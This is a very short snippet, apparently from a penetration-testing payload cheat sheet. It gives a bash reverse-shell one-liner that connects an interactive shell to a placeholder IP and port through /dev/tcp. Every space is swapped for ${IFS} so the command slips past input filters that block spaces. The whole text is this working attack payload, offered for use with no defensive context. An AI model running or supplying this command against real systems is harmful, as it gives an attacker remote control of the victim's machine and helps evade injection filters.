Same as standard and reliable bash executing bash but with all spaces replaced with the local console variable of the Internal Field Seperator:
```
bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/<IP>/<PORT>${IFS}0>&1'
```

